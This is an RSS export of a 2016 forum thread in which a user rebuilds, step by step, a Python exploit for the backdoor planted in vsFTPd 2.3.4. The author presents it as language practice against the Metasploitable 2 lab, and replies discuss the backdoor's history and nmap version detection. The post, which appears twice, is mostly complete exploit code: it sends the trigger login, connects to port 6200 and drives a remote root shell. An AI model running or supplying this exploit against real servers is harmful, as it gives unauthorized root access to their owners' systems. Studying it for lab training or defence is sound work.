<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Re-building a vsFTPd backdoor exploit in Python</title>
    <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159</link>
    <description>Hello everyone! I&#39;ve recently discovered my personally favorite way to practice programming languages. Basically, we&#39;re going to find an exploit written in a different language, and we&#39;re going to rebuild it in the language we want to practice.

In this article, we&#39;re going to be rebuilding an exploit that triggers a back door planted in vsFTPd version 2.3.4. Let&#39;s quickly run through how this back door is triggered and then we&#39;ll move onto the code.

Triggering this back door is actually really simple, we simply need to log in with the username &quot;backdoored:)&quot; and the password &quot;invalid&quot;. Once we attempt to log in with these credentials, we should be able to connect to port 6200 to recieve a root shell. Now that we know how this works, let&#39;s get into the code!

First, we&#39;re going to set our interpreter path and import the modules we need:
```
#! /usr/bin/python

import sys # For arguments
import socket # To trigger the back door
import threading # Shell handling
import time # Delay for shell interaction
```
Now that we have our modules, let&#39;s quickly handle the command line arguments. We&#39;re going to take the target IP as the first argument, and the target port number as the second. Let&#39;s see the code we&#39;ll use to take our arguments:
```
if len(sys.argv) == 3:
    pass
else:
    print &quot;usage: ./exploit.py [TARGET IP] [TARGET PORT]&quot;
    sys.exit(1)
target = sys.argv[1]
port = sys.argv[2]
```

Now that we have our arguments handled, we can make the triggering function. We&#39;re going to need to make a socket and log in with the aforementioned credentials. We&#39;ll name our function &quot;trigger&quot;, simple enough, let&#39;s take a look at the code:
```
def trigger():
    trigger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        trigger_socket.connect((target, int(port)))
    except Exception:
        print &#39;[!] Failed to Reach Target&#39;
        sys.exit(1)
    print &#39;[*] Attempting to Trigger the Back Door... &#39;
    banner = trigger_socket.recv(1024)
    if &#39;vsFTPd 2.3.4&#39; in banner:
        trigger_socket.send(&quot;USER backdoored:)\n&quot;)
        trigger_socket.recv(1024)
        trigger_socket.send(&quot;PASS invalid\n&quot;)
        trigger_socket.close()
        print &#39;[*] Trigger Process Complete, Spawning Shell...&#39;
        return
    else:
        print &#39;[!] Invalid Service Detected&#39;
        sys.exit(1)
```
Alright, now that might seem a bit complicated, but it&#39;s really not. See simply made a socket, grabbed the banner from the server, evaluated the service based on the banner, and logged in with the triggering credentials. Now that we&#39;ve triggered the back door, we need to connect to it. 

First, we&#39;re going to make a function that will run as a thread. This means that it will run at the same time as the rest of the script. This function will infinitely print information that it receives from a socket that we&#39;re going to connect to the newly spawned shell. Let&#39;s look at this function now:
```
def recv_from_shell(sock, status):
    sock.settimeout(3)
    while status == True:
        try:
            print sock.recv(1024).strip()
        except socket.timeout:
            pass
        except Exception:
            return
```
Now that we have this function, we can make our final function. This function will call the trigger() function, start the recieving the thread, and send the user&#39;s input to the shell. Let&#39;s take a look at this final function:
```
def handle():
    trigger()
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_status = True
    try:
        shell_socket.connect((target, 6200))
    except Exception:
        print &#39;[!] Failed Interaction with Shell&#39;
        sys.exit(1)
    shell_recv_thread = threading.Thread(target=recv_from_shell, args=(shell_socket, shell_status))
    shell_recv_thread.start()
    print &#39;[*] Root Shell Spawned, Pwnage Complete\n&#39;
    while 1:
        command = raw_input.strip()
        if command == &#39;exit&#39;:
            shell_status = False
            shell_socket.close()
            shell_recv_thread.join()
            sys.exit(0)
        shell_socket.send(command + &#39;\n&#39;)

try:
    handle()
except Exception:
    sys.exit(1) # Emergency exit
```
There we go! Now that we have our exploit ([available here](http://pastebin.com/v0PTJP7i)), let&#39;s launch it against our victim. We&#39;ll be firing it against Metasploitable 2 , which runs vsFTPd 2.3.4 on port 21. Let&#39;s launch our exploit and see what happens:

![](upload://qs8QSVRNdKApia0fVJZNLjlF62N.png)

There we have it! Our exploit woks! I hope that we can re-build more exploits like this in the future, as it&#39;s a very good way to practice a language of your choice. If you have a language you need to practice, feel free to follow this with your own spin on things!

Thank you for reading!

-Defalt</description>
    
    <lastBuildDate>Sun, 08 May 2016 20:37:03 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/21</link>
        <pubDate>Sun, 21 Jan 2018 00:43:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-21</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>I think the Linux community for that distro wanted to keep it quiet so that the amount of users they had, and got wouldn’t be affected. Either way, we know it’s a possibility, and it just reinforces the fact that we should e more wary of a “download” button, even on our most trusted websites.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/20</link>
        <pubDate>Sun, 08 May 2016 20:37:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-20</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I recall something similar aswell. Can’t put my finger on it though.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/19</link>
        <pubDate>Sun, 08 May 2016 20:31:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-19</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>I think hackers also did the same thing with the download for a Linux Distro. Mint I believe it was. Although I’m not too well read on which one it was.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/18</link>
        <pubDate>Sun, 08 May 2016 15:07:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-18</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Pico is right. You could just log in with a normal FTP client and type the credentials. Some hackers broke into vsftpd and updated the binary on the download page.  And thus lots of people updated and downloaded the hacked version of vsftpd.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/17</link>
        <pubDate>Sat, 07 May 2016 08:42:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-17</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="EnergyWolf" data-post="13" data-topic="159">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/energywolf/40/57_2.png" class="avatar"> EnergyWolf:</div>
<blockquote>
<p>I didn’t get why those particular Username and Password triggered the exploit …</p>
</blockquote>
</aside>
<p>That’s because this is not really a exploit. This is a backdoor.</p>
<p>There is code in that specific version of vsftpd that checks if username contains the ‘:)’ string, and then, it fires the remote shell.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/16</link>
        <pubDate>Sat, 07 May 2016 08:04:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-16</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>You’re very familiar with Ruby, I gather.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/15</link>
        <pubDate>Fri, 06 May 2016 00:42:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-15</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I’ve moved this post to the How-to section for you <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/14</link>
        <pubDate>Thu, 05 May 2016 22:51:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-14</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[EnergyWolf]]></dc:creator>
        <description><![CDATA[
            <p>Nice job! One thing I had read before but forgotten, so it confused me, was that the backdoor requires that a user attempt a login with a username with ‘:)’ in it to be triggered. Before I went and looked this up again, I didn’t get why those particular Username and Password triggered the exploit …</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/13</link>
        <pubDate>Thu, 05 May 2016 18:35:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-13</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/oaktree">@oaktree</a>:<br>
LOL. Love the “Dunno” reply.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/12</link>
        <pubDate>Thu, 05 May 2016 07:37:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-12</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Agreed! There are still discussions undergoing how it should all work.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/11</link>
        <pubDate>Thu, 05 May 2016 06:12:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-11</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[Defalt]]></dc:creator>
        <description><![CDATA[
            <p>Yes you’ll need to know the FTP service version to use the exploit. The flag to activate service detection in nmap is -sV</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/10</link>
        <pubDate>Thu, 05 May 2016 04:08:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-10</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[AgentSniff]]></dc:creator>
        <description><![CDATA[
            <p>Nice! I have medium skills on C and already played a bit with sockets.</p>
<p>I’m looking to learn Python more deeply, i know some OO programming in C++</p>
<p>python make things very simple, and the code looks more clean for me once you don’t declare variables types and don’t need to handle pointers and memory allocations, python manages this for you right?</p>
<p>to try this exploit on a target, i should first make a recon with nmap -v to see the FTP version?</p>
<p>/* AgentSniff */</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/9</link>
        <pubDate>Thu, 05 May 2016 03:45:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-9</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>:<br>
Like we’ve often said, it’s a new site, a work in progress. Some things might not last long; some may change. Nothing is written in stone, literally and metaphorically.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/8</link>
        <pubDate>Thu, 05 May 2016 00:04:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-8</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>So… there will be two different places with two different sets of posts?</p>
<p>The pull request thing is not that hard, but posting in here is zero effort… I’d expect that people will post here in the forums and then what is the point of the website… Am I missing something?</p>
<p><em>P.S.: I’m perfectly fine with people posting here… just want to understand how the two platforms fit together</em></p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/7</link>
        <pubDate>Wed, 04 May 2016 23:33:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-7</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>This is pretty dope, although I’m unfamiliar with threads in Python.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/6</link>
        <pubDate>Wed, 04 May 2016 22:06:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-6</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>It’s up to the contributor. I don’t think Defalt likes posting to the site using the Github submission platform.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/5</link>
        <pubDate>Wed, 04 May 2016 20:47:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-5</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Nice post!</p>
<p>When will we see it added to the website?</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/4</link>
        <pubDate>Wed, 04 May 2016 16:23:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-4</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Great post mate! Certainly cleared up a lot of stuff for me!<img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/3</link>
        <pubDate>Wed, 04 May 2016 07:02:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-3</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Nice post Defalt! I’ve only just realised how nice socket programming in python is compared to C <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:">  Although C is useful, Python can be a really useful way of writing quick little scripts.</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/2</link>
        <pubDate>Wed, 04 May 2016 06:27:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-2</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
      <item>
        <title>Re-building a vsFTPd backdoor exploit in Python</title>
        <dc:creator><![CDATA[Defalt]]></dc:creator>
        <description><![CDATA[
            <p>Hello everyone! I’ve recently discovered my personally favorite way to practice programming languages. Basically, we’re going to find an exploit written in a different language, and we’re going to rebuild it in the language we want to practice.</p>
<p>In this article, we’re going to be rebuilding an exploit that triggers a back door planted in vsFTPd version 2.3.4. Let’s quickly run through how this back door is triggered and then we’ll move onto the code.</p>
<p>Triggering this back door is actually really simple, we simply need to log in with the username “backdoored:)” and the password “invalid”. Once we attempt to log in with these credentials, we should be able to connect to port 6200 to recieve a root shell. Now that we know how this works, let’s get into the code!</p>
<p>First, we’re going to set our interpreter path and import the modules we need:</p>
<pre><code class="lang-auto">#! /usr/bin/python

import sys # For arguments
import socket # To trigger the back door
import threading # Shell handling
import time # Delay for shell interaction
</code></pre>
<p>Now that we have our modules, let’s quickly handle the command line arguments. We’re going to take the target IP as the first argument, and the target port number as the second. Let’s see the code we’ll use to take our arguments:</p>
<pre><code class="lang-auto">if len(sys.argv) == 3:
    pass
else:
    print "usage: ./exploit.py [TARGET IP] [TARGET PORT]"
    sys.exit(1)
target = sys.argv[1]
port = sys.argv[2]
</code></pre>
<p>Now that we have our arguments handled, we can make the triggering function. We’re going to need to make a socket and log in with the aforementioned credentials. We’ll name our function “trigger”, simple enough, let’s take a look at the code:</p>
<pre><code class="lang-auto">def trigger():
    trigger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        trigger_socket.connect((target, int(port)))
    except Exception:
        print '[!] Failed to Reach Target'
        sys.exit(1)
    print '[*] Attempting to Trigger the Back Door... '
    banner = trigger_socket.recv(1024)
    if 'vsFTPd 2.3.4' in banner:
        trigger_socket.send("USER backdoored:)\n")
        trigger_socket.recv(1024)
        trigger_socket.send("PASS invalid\n")
        trigger_socket.close()
        print '[*] Trigger Process Complete, Spawning Shell...'
        return
    else:
        print '[!] Invalid Service Detected'
        sys.exit(1)
</code></pre>
<p>Alright, now that might seem a bit complicated, but it’s really not. See simply made a socket, grabbed the banner from the server, evaluated the service based on the banner, and logged in with the triggering credentials. Now that we’ve triggered the back door, we need to connect to it.</p>
<p>First, we’re going to make a function that will run as a thread. This means that it will run at the same time as the rest of the script. This function will infinitely print information that it receives from a socket that we’re going to connect to the newly spawned shell. Let’s look at this function now:</p>
<pre><code class="lang-auto">def recv_from_shell(sock, status):
    sock.settimeout(3)
    while status == True:
        try:
            print sock.recv(1024).strip()
        except socket.timeout:
            pass
        except Exception:
            return
</code></pre>
<p>Now that we have this function, we can make our final function. This function will call the trigger() function, start the recieving the thread, and send the user’s input to the shell. Let’s take a look at this final function:</p>
<pre><code class="lang-auto">def handle():
    trigger()
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_status = True
    try:
        shell_socket.connect((target, 6200))
    except Exception:
        print '[!] Failed Interaction with Shell'
        sys.exit(1)
    shell_recv_thread = threading.Thread(target=recv_from_shell, args=(shell_socket, shell_status))
    shell_recv_thread.start()
    print '[*] Root Shell Spawned, Pwnage Complete\n'
    while 1:
        command = raw_input.strip()
        if command == 'exit':
            shell_status = False
            shell_socket.close()
            shell_recv_thread.join()
            sys.exit(0)
        shell_socket.send(command + '\n')

try:
    handle()
except Exception:
    sys.exit(1) # Emergency exit
</code></pre>
<p>There we go! Now that we have our exploit (<a href="http://pastebin.com/v0PTJP7i" rel="noopener nofollow ugc">available here</a>), let’s launch it against our victim. We’ll be firing it against Metasploitable 2 , which runs vsFTPd 2.3.4 on port 21. Let’s launch our exploit and see what happens:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b966ed6aff88eab6ee14b3a45bd34ed80ebda9ad.png" alt="" data-base62-sha1="qs8QSVRNdKApia0fVJZNLjlF62N" width="" height=""></p>
<p>There we have it! Our exploit woks! I hope that we can re-build more exploits like this in the future, as it’s a very good way to practice a language of your choice. If you have a language you need to practice, feel free to follow this with your own spin on things!</p>
<p>Thank you for reading!</p>
<p>-Defalt</p>
          <p><a href="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159/1</link>
        <pubDate>Wed, 04 May 2016 06:07:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-159-1</guid>
        <source url="https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159.rss">Re-building a vsFTPd backdoor exploit in Python</source>
      </item>
  </channel>
</rss>
